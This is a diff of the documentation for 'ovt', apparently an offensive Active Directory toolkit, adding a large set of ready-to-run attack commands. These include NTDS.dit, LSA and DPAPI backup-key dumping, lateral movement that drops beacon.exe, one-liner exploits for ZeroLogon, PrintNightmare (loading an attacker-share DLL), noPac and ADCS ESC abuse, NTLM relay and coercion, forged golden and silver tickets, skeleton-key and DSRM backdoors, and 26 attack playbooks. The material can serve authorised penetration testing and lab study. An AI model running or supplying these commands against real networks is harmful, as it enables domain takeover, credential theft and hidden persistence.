 # Dump SAM hashes from hive files
@@ -1539,6 +1753,14 @@ ovt secrets lsa --security ./SECURITY --system ./SYSTEM
 
 # Dump cached domain credentials (DCC2)
 ovt secrets dcc2 --security ./SECURITY --system ./SYSTEM
+
+# Impacket secretsdump.py offline-NTDS workflow: parse the ESENT page tree,
+# recover the PEK list (RC4 legacy + WS2016+ AES) from the boot key, and emit
+# secretsdump-format hash lines + Kerberos AES keys / WDigest / cleartext
+ovt secrets ntds-dit --ntds ./ntds.dit --system ./SYSTEM
+ovt secrets ntds --ntds ./ntds.dit --bootkey 0c8e...64hex -o secretsdump.out
+# With tombstoned (deleted) objects included
+ovt secrets ntds-dit --ntds ./ntds.dit --system ./SYSTEM --include-deleted
 ```
 
 | Subcommand | Required Flags | What it does |
@@ -1546,6 +1768,24 @@ ovt secrets dcc2 --security ./SECURITY --system ./SYSTEM
 | `sam` | `--sam`, `--system` | Dump SAM hashes |
 | `lsa` | `--security`, `--system` | Dump LSA secrets |
 | `dcc2` | `--security`, `--system` | Dump cached domain credentials |
+| `ntds-dit` (alias `ntds`) | `--ntds`, `--system` or `--bootkey` | Offline NTDS.dit ESE parser: PEK decryption, NTLM/LM history, AES keys, cleartext; `-o` writes file, `--include-deleted` keeps tombstones |
+
+**LSA DPAPI key records:** the SECURITY hive carries the machine and user
+DPAPI root keys, so `ovt secrets lsa` surfaces them as decoded records:
+
+- `G$DPAPI_MACHINE_KEY` (machine DPAPI backup key), `G$DPAPI_USER_KEY`,
+  and `G$BCKKEYLINK\{GUID}` links in the LSA secret stream.
+- A `G$DPAPI_MACHINE_KEY` entry yields a **DPAPI domain backup key**
+  (pvk-style RSA blob) -- the same thing mimikatz's
+  `lsadump::secrets` / dpapi `masterkey` hunt needs. Captured backup keys
+  decrypt every synced masterkey file offline (Chrome/Edge cookies,
+  CREDMAN blobs): `ovt vault` reads exported keys via `--backup-key-file`.
+- Programmatic surface identical to the CLI parse:
+  `overthrone_core::crypto::dpapi::parse_masterkey_file_bytes()` parses
+  a stolen masterkey file, and the secretsdump LSA parser returns decoded
+  `DpapiKeyRecord`s (`parse_dpapi_key_secret()` in
+  `overthrone_core::proto::secretsdump`), so tooling can chain
+  hive -> backup key -> masterkey decryption without leaving Rust.
 
 ---
 
@@ -2164,9 +2404,10 @@ ovt crack --hash-file ./loot/kerberoast_hashes.txt --wordlist rockyou.txt
 
 ### Lateral Movement
 ```bash
-ovt move smbexec -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --command "whoami"
-ovt move wmiexec -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --command "ipconfig"
-ovt move smb put -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant ./beacon.exe "C$\Windows\Temp\"
+# SMBExec
+ovt exec -t 192.168.57.10 --command "whoami" -d sevenkingdoms.local -u vagrant -p vagrant --method smbexec
+ovt exec -t 192.168.57.10 --command "ipconfig" -d sevenkingdoms.local -u vagrant -p vagrant --method wmiexec
+ovt smb put -t 192.168.57.10 -l ./beacon.exe -r "C$/Windows/Temp/beacon.exe" -d sevenkingdoms.local -u vagrant -p vagrant
 ```
 
 ### Privilege Escalation
@@ -2178,109 +2419,83 @@ ovt shadow attack -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant 
 
 ### Dump & PWN
 ```bash
-ovt dump 192.168.57.10 dcsync -d sevenkingdoms.local -u administrator -p 'Password123!'
-ovt dump 192.168.57.10 ntds-vss -d sevenkingdoms.local -u administrator -p 'Password123!'
-ovt forge golden -d sevenkingdoms.local --krbtgt-hash <hash> --user administrator --sid <domain-sid>
+ovt dump -t 192.168.57.10 dcsync -d sevenkingdoms.local -u administrator -p 'Password123!'
+ovt dump -t 192.168.57.10 ntds-vss -d sevenkingdoms.local -u administrator -p 'Password123!'
+ovt forge golden --domain-sid <domain-sid> --krbtgt-hash <hash> -d sevenkingdoms.local -u administrator
 ```
 
 ---
 
 ## CVE Exploit Quick Reference
 
-Quick commands to exploit or assess each major Windows vulnerability class with Overthrone.
+Every row below is verified against the live CLI (`ovt <cmd> --help`). Commands assume
+`-H <DC>`/`-d <DOMAIN>`/`-u <user>`/`-p <pass>` globals where creds are needed.
 
-### ADCS & Certificate Abuse (ESC1-16)
+### CVE Matrix
 
-```bash
-# ESC1 (CVE-2022-26923) -- SAN abuse
-ovt adcs esc1 --ca "CA\NAME" --template "User" --target-user "administrator" -d DOMAIN -u USER -p PASS --http
+| CVE / Technique | ovt one-liner | When to use | Prerequisites |
+|---|---|---|---|
+| CVE-2020-1472 ZeroLogon | `ovt zerologon check -t DC-IP` then `ovt zerologon probe -t DC-IP`; `ovt zerologon exploit -t DC-IP --force` (DESTRUCTIVE -- restore password after) | Null-session RF+GSS-NegNTLM Netlogon abuse; full domain takeover from nothing | Domain controller reachable on 135/49152+ RPC |
+| CVE-2021-1675 / CVE-2021-34527 PrintNightmare | `ovt printnightmare check -t TARGET`; `ovt printnightmare exploit -t TARGET --dll \\ATTACKER\share\evil.dll`; cleanup `ovt printnightmare delete -t TARGET` | Spooler runs attacker DLL as SYSTEM; local admin on any host, RCE on DC when spoolsvc exposed | Spooler running + writable UNC share (`ovt ntlm smb-daemon --share-name evil`) |
+| CVE-2021-42278 / 42287 noPac/SamNameSpoof | `ovt forge no-pac --target-dc dc.target.local -d DOMAIN -u USER -p PASS` (one shot); or two-stage `ovt exploit samnamespoof --dc-sam "DC01$" --password Exploit123!` | Unpatched DC KDC confusion via spoofed sAMAccountName | Machine-account quota > 0; DC unpatched |
+| CVE-2020-17049 Bronze Bit | `ovt forge bronze-bit --spn "cifs/dc.target.local" -d DOMAIN -u USER -p PASS` | S4U2Proxy non-forwardable-flag bypass when RBCD ticket must cross a protected group | Delegation rights + service ticket |
+| CVE-2022-26923 Certifried / ESC1 SAN abuse | `ovt adcs esc1 --ca "CA\NAME" --template "User" --target-user administrator -H DC -d DOMAIN -u USER -p PASS --http`; dedicated dNSHostName path: `ovt certifried --ca-url "http://CA/certsrv/" --target-dc-fqdn dc.target.local --template User` | Enroll as another principal (UPN/SAN/dNSHostName spoofing) on vulnerable templates | Web Enrollment reachable; template with ENROLLEE_SUPPLIES_SUBJECT (or dcspoof) |
+| ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 | `ovt adcs esc6 --ca "CA\NAME" --target-user administrator -H DC -d DOMAIN -u USER -p PASS` | CA-wide flag lets any template carry attacker SAN | CA flag enabled (find it: `ovt adcs enum`) |
+| ESC8 ADCS relay (NTLM to Web Enrollment) | `ovt ntlm relay --targets "http://DC-IP/certsrv/" --port 8080 --auto-coerce-targets DC-FQDN` | Relay coerced DC machine auth onto certsrv, then PKINIT-get-TGT as the DC | Web Enrollment NTLM + coercion (PrinterBug/PetitPotam); follow up with `ovt kerberos get-tgt --pkinit-cert ... --pkinit-key ...` |
+| ESC15 (CVE-2024-49019) Schema V1 SAN | `ovt adcs esc15 --ca "CA\NAME" --template "WebServer" --target-user administrator -H DC -d DOMAIN -u USER -p PASS` | April-2024 patches only half-fixed V1 templates; SAN injection revived | Schema V1 template + unpatched CA |
+| CVE-2025-33073 NTLM reflection (SMB) | `ovt ntlm smb-relay --targets "smb://TARGET" --port 445 --auto-coerce-targets TARGET` | Relay machine auth BACK to the originating host (signing enforced but reflection accepted) | Windows hosts missing June-2025 patch |
+| CVE-2025-21311 (HTTP-to-LDAP relay EoP) | `ovt ntlm http-relay --targets "http://TARGET/path" --port 8080` | HTTP NTLM handoff where LDAP channel-binding/signing is relaxed | Vulnerable client init auth |
+| CVE-2025-24054 NTLM hash disclosure | `ovt ntlm capture --interface eth0` (poisoning on) then drop a crafted `.zip`/`.SCF`/`.searchConnector-ms` on a share/accessible path | Steal NTLMv2 without any relay | Victim opens/imports the file; captured hashes land in stdout + loot |
+| CVE-2019-1040 MIC bypass (NTLM tampering) | `ovt ntlm ldap-relay --target DC-IP --port 389` | Relay to LDAP with the MIC stripped -- our LDAP relay strips MIC by default (`--no-signing-bypass` re-enables server checks if you WANT failure) | Unpatched DCs; any NTLM auth you can intercept |
+| CVE-2021-1678 (relay-prevention bypass / classic relay) | `ovt ntlm relay --targets "ldap://DC-IP" --port 389` | Generic relay where SMB signing or target policy does not stop you | Vulnerable/unpadded targets |
+| CVE-2025-53779 BadSuccessor (dMSA) | `ovt dmsa bad-successor --target "OU=..." -d DOMAIN -H DC -u USER -p PASS` | Delegate dMSA identity escalation in WS2025-only domains | Delegated admin over an OU; KDS root key access via `ovt dmsa golden` |
+| CVE-2026-54121 Certighost (CA chase) | `ovt certighost --ca-server CA-FQDN -d DOMAIN -u USER -p PASS` | CA web-enrollment chase fallback when direct ICPR/WebEnrollment fails | CES/NDES reachable + template rights |
 
-# ESC6 -- EDITF_ATTRIBUTESUBJECTALTNAME2
-ovt adcs esc6 --ca "CA\NAME" --template "User" --target-user "administrator" -d DOMAIN -u USER -p PASS --http
+### Coercion matrix (all built into the relay commands)
 
-# ESC8 (CVE-2022-26931) -- NTLM relay to ADCS
-ovt ntlm adcs-relay --target "http://CA/certsrv/" --port 8080 --cert-template "User"
+No standalone `trigger-*` subcommands exist -- the relay controller raises the listener
+first, then fires the coercion at every host in `--auto-coerce-targets` with the UNC
+pointed at your listener IP:
 
-# ESC15 (CVE-2024-49019) -- Schema V1 SAN Abuse
-ovt adcs esc15 --ca "CA\NAME" --template "WebServer" -d DOMAIN -u USER -p PASS --http
-```
+| Trigger | Fired by | Notes |
+|---|---|---|
+| PrinterBug (MS-RPRN) | `--auto-coerce-targets HOST` on any relay command | Authenticated with `--auto-coerce-domain/user/password`, null-session otherwise |
+| PetitPotam (MS-EFSRPC) | same | Chain: HTTPS coercion for ADCS/ESC8 |
+| DFSCoerce (MS-DFSNM) | same | Passed after the first two fail |
+| ShadowCoerce (MS-FSRVP) | same | WebDAV path, fired when the HTTP relay is active |
 
-### NTLM Relay Attacks
+Example: `ovt ntlm ldap-relay --target 192.168.57.10 --port 8080 --auto-coerce-targets 192.168.57.22 --auto-coerce-domain sevenkingdoms.local --auto-coerce-user vagrant --auto-coerce-password vagrant`
 
-```bash
-# CVE-2025-33073 -- NTLM Reflection (SMB)
-ovt ntlm smb-relay -l 0.0.0.0:445 -t ldap://TARGET --auto-coerce-domain DOMAIN --auto-coerce-user USER --auto-coerce-password PASS
+### Ticket-forging persistence (kill-chain endgame)
 
-# CVE-2025-21311 -- NTLM Relay EoP (HTTP->LDAP)
-ovt ntlm http-relay -l 0.0.0.0:8080 -t ldap://TARGET
+| Craft | Command (verified flags) | Needs |
+|---|---|---|
+| Golden TGT | `ovt forge golden --domain-sid S-1-5-21-X --krbtgt-hash <32hex> [--user administrator] [--output golden.kirbi]` | krbtgt NT hash + domain SID |
+| Silver ST | `ovt forge silver --domain-sid S-1-5-21-X --service-hash <32hex> --spn "cifs/TARGET" [--user ...]` | service-account hash + SPN |
+| Diamond TGT | `ovt forge diamond -d DOMAIN --domain-sid S-1-5-21-X --user USER --krbtgt-hash <32hex> -u USER -p PASS` | krbtgt key + victim creds (TGT decrypted/PAC-swapped/re-encrypted) |
+| DSRM backdoor | `ovt forge dsrm-backdoor --domain-sid S-1-5-21-X --krbtgt-hash <32hex>` | krbtgt hash; syncs DSRM to DA |
+| ACL backdoor (DCSync rights) | `ovt forge acl-backdoor --target-dn "CN=..." --trustee "CN=..."` | WriteDacl on domain NC |
+| Shadow credentials | `ovt exploit shadow-credentials --target-dn "CN=X,DC=..."` (or lifecycle: `ovt shadow-cred add|list|remove|clear <TARGET>`) | GenericWrite on msDS-KeyCredentialLink |
+| Skeleton key | `ovt forge skeleton -H DC -d DOMAIN -u ADMIN -p PASS --payload-path ./payload.dll` | DA session; patches LSASS (`--master-password` default `overthrone`) |
+| KRBTGT key rotation | `ovt forge rotate-ticket --input X.kirbi --old-key <hex> --new-key <hex>` | both keys (16-hex RC4 or 32-hex AES256) |
 
-# CVE-2025-24054 -- NTLM Hash Disclosure
-ovt ntlm capture --interface eth0 --poison
+### ESC coverage quick index
 
-# CVE-2019-1040 -- LDAP Signing Bypass (Drop the MIC)
-ovt ntlm ldap-relay -l 0.0.0.0:8080 -t ldap://TARGET
+`ovt adcs` ships ESC1-16 plus orchestration -- every variant except the
+guidance-only ones (esc4/esc5/esc7/esc14) is directly exploitable; `auto`
+scans all of them and picks by severity:
 
-# CVE-2021-1678 -- Classic NTLM Relay to LDAP
-ovt ntlm relay -l 0.0.0.0:8080 -t ldap://TARGET
-```
+| Command | Role |
+|---|---|
+| `ovt adcs enum -H DC -d DOMAIN -u USER -p PASS` | Dump templates + CA config, flag misconfigs |
+| `ovt adcs auto -H DC -d DOMAIN -u USER -p PASS -U "administrator" --exploit` | Enumerate all ESCs + auto-exploit the worst one |
+| `ovt adcs escN ...` | Direct ESC1-16 execution (`--help` per variant for required flags) |
+| `ovt adcs request --ca "CA\NAME" ...` | Plain certificate request for testing |
+| `ovt adcs get-ca-cert --ca "CA\NAME"` | Pull CA cert via DCOM/SMB pipe |
 
-### Kerberos Attacks
-
-```bash
-# Kerberoasting
-ovt kerberos roast -H DC -d DOMAIN -u USER -p PASS
-ovt crack --hash-file ./loot/kerberoast_hashes.txt --wordlist rockyou.txt
-
-# AS-REP Roasting
-ovt kerberos asrep-roast -H DC -d DOMAIN -U ./loot/users.txt
-
-# Bronze Bit (CVE-2020-17049)
-ovt forge bronze-bit -d DOMAIN --user USER --domain-sid S-1-5-21-... --target-spn "cifs/TARGET"
-
-# noPac (CVE-2021-42278/42287)
-ovt forge no-pac -H DC -d DOMAIN -u USER -p PASS
-
-# Password Spray (lockout-safe)
-ovt spray -H DC -d DOMAIN --password 'Season2026!' --userlist ./loot/users.txt --delay 2000
-```
-
-### Coercion & Auth Triggering
-
-```bash
-# PrinterBug (MS-RPRN, CVE-2021-1678)
-ovt ntlm trigger-printer-bug -H DC -d DOMAIN -u USER -p PASS --target TARGET --capture-ip ATTACKER
-
-# PetitPotam (MS-EFSRPC, CVE-2021-42284)
-ovt ntlm trigger-petitpotam -H DC -d DOMAIN -u USER -p PASS --target TARGET --capture-ip ATTACKER
-
-# ShadowCoerce (WebDAV, CVE-2022-30154)
-ovt ntlm relay -l 0.0.0.0:8080 -t ldap://TARGET --auto-coerce-targets TARGET
-```
-
-### Ticket Forging & Persistence
-
-```bash
-# Golden Ticket (full PAC construction)
-ovt forge golden -d DOMAIN --krbtgt-hash <32hex> --user administrator --sid S-1-5-21-...
-
-# Silver Ticket (service-specific)
-ovt forge silver -d DOMAIN --service-hash <32hex> --user administrator --spn "cifs/TARGET"
-
-# Diamond Ticket (PAC modification, preserves KDC checksum)
-ovt forge diamond -d DOMAIN --user USER --domain-sid S-1-5-21-... --tgt ./tgt.kirbi
-
-# Shadow Credentials
-ovt shadow attack -H DC -d DOMAIN -u USER -p PASS --target "target-user"
-
-# Skeleton Key (native DLL, patch LSASS)
-ovt forge skeleton -H DC -d DOMAIN -u ADMIN -p PASS --payload-path ./skeleton_key.dll
-
-# DSRM Backdoor
-ovt forge dsrm-backdoor -d DOMAIN --domain-sid S-1-5-21-... --krbtgt-hash <32hex>
-
-# ACL Backdoor (DACL modification)
-ovt forge acl-backdoor -d DOMAIN --target-dn "CN=Admin,CN=Users,DC=DOMAIN,DC=local" --trustee-dn "CN=USER,CN=Users,DC=DOMAIN,DC=local"
-```
+Rounding out the ESC set: ESC9 (`ovt adcs esc9` -- UPN poisoning with No Security
+Extension), ESC10 (weak mapping), ESC11 (ICPR relay), ESC12 (CA key export), ESC13
+(OID-to-group link), ESC16 (security extension disabled).
 
 ### Zero-Knowledge Kill Chain (No Creds)
 
@@ -2289,15 +2504,17 @@ ovt forge acl-backdoor -d DOMAIN --target-dn "CN=Admin,CN=Users,DC=DOMAIN,DC=loc
 ovt enum pre -H DC -d DOMAIN
 
 # Step 2: Zero-knowledge user enumeration via Kerberos
-ovt kerberos user-enum -H DC -d DOMAIN --userlist /usr/share/seclists/Usernames/Names/names.txt
+ovt kerberos user-enum -H DC -d DOMAIN -U /usr/share/seclists/Usernames/Names/names.txt
 
 # Step 3: Check for no-preauth accounts
 ovt kerberos asrep-roast -H DC -d DOMAIN -U ./loot/users.txt
 
 # Step 4: Spray common passwords (lockout-safe)
-for pw in 'Season2026!' 'Winter2026!' 'Password123!'; do
-  ovt spray -H DC -d DOMAIN --password "$pw" --userlist ./loot/users.txt --delay 3000
-done
+ovt spray -H DC -d DOMAIN --password 'Season2026!' -U ./loot/users.txt --delay 3000
+
+# Step 5: Crack the AS-REP hashes and mint a TGT from the cracked password
+ovt crack --file ./loot/asrep_hashes.txt --wordlist rockyou.txt
+ovt forge as-rep-to-tgt --cracked-password 'P@ssword' --hash '$krb5asrep$...' --output user.kirbi
 ```
 
 ### Full PWN (Assumes vagrant:vagrant)
@@ -2305,25 +2522,22 @@ done
 ```bash
 # 1. Full domain enumeration
 ovt enum all -H DC -d DOMAIN -u vagrant -p vagrant
-ovt adcs auto -H DC -d DOMAIN -u vagrant -p vagrant
+ovt adcs auto -H DC -d DOMAIN -u vagrant -p vagrant -U "administrator" --exploit
 
 # 2. Kerberoast + crack
 ovt kerberos roast -H DC -d DOMAIN -u vagrant -p vagrant
-ovt crack --hash-file ./loot/kerberoast_hashes.txt --wordlist rockyou.txt
+ovt crack --file ./loot/kerberoast_hashes.txt --wordlist rockyou.txt
 
-# 3. ADCS exploit via dispatcher
-ovt forge adcs --ca-server "CA\NAME" --domain DOMAIN -u vagrant -p vagrant
-
-# 4. Lateral movement
+# 3. Lateral movement
 ovt exec -t DC -c "whoami" -d DOMAIN -u vagrant -p vagrant
 
-# 5. Credential dump (VSS shadow copy if DRSUAPI unavailable)
-ovt dump DC ntds-vss -d DOMAIN -u vagrant -p vagrant
+# 4. Credential dump (VSS shadow copy if DRSUAPI unavailable)
+ovt dump -t DC ntds-vss -d DOMAIN -u vagrant -p vagrant
 
-# 6. Persist
-ovt forge golden -d DOMAIN --krbtgt-hash <hash> --user administrator --sid S-1-5-21-<sid>
+# 5. Persist (krbtgt hash from the dump)
+ovt forge golden --domain-sid S-1-5-21-<sid> --krbtgt-hash <hash> -d DOMAIN -u administrator
 
-# 7. Report
+# 6. Report
 ovt report --format pdf --output engagement-report.pdf
 ```
 
@@ -2363,7 +2577,7 @@ ovt forge golden --krbtgt-hash HASH --domain-sid SID    # Golden ticket
 ovt laps -H DC -d DOMAIN -u USER -p PASS                # Read LAPS
 
 # === ACL & GPO ABUSE ===
-ovt acl force-password -t jdoe -p 'NewPass!'            # Force password change
+ovt acl force-password -t jdoe -n 'NewPass!'             # Force password change
 ovt acl add-member -g "CN=Domain Admins,..." -m "CN=..." # Add to group
 ovt gpo write -g "Default Policy" --sysvol <path> -c cmd # GPO ImmediateTask
 
@@ -2376,7 +2590,8 @@ ovt wizard -t DA --dc-host DC -d DOMAIN -u USER          # Guided mode
 
 # === NTLM RELAY ===
 ovt ntlm capture --interface eth0                        # Capture hashes
-ovt ntlm relay --targets TARGET:445                      # Relay to target
+ovt ntlm relay --targets "smb://TARGET" --port 445       # Relay to target
+ovt ntlm ldap-relay --target DC-IP --port 389            # MIC-stripped LDAP relay
 
 # === MISC ===
 ovt doctor                                                # Health check
@@ -2384,6 +2599,33 @@ ovt report -o report.pdf --format pdf                     # Generate report
 ovt tui --domain DOMAIN                                   # Launch TUI
 ovt module run zerologon -t DC                            # Zerologon check
 ```
+
+---
+
+## Scenario Playbook (`ovt playbook`)
+
+The built-in cheatsheet ships 26 ready-to-run recipes (everything above, pre-assembled
+per scenario, with prerequisites and step sequencing). Fully offline:
+
+```bash
+# List every recipe (name + summary)
+ovt playbook list
+
+# Print one recipe (numbered steps, one-liner commands, notes)
+ovt playbook show golden
+ovt playbook show samname
+```
+
+Aliases: `ovt cheatsheet list|show <name>` too. Recipe names are matched
+case-insensitively; unknown names exit non-zero with the available list.
+
+All 26 recipe names: `recon`, `kerberoast`, `asreproast`, `spray`, `dcsync`,
+`golden`, `silver`, `diamond`, `skeleton-key`, `lateral` (smbexec/wmiexec/
+psexec/winrm tours), `rbcd`, `shadowcred`, `samname` (noPac family),
+`zerologon`, `printnightmare`, `certifried`, `adcs`, `relay`, `unconstrained`
+(relay-to-DA), `laps`, `mssql`, `offline-dump`, `quick-matrix`, `gpo`, `graph`,
+`relay-to-da`. Persistence cleanup round-trips live inside the destructive
+recipes (`ovt exploit cleanup <artifact>`).
 
 ---
 
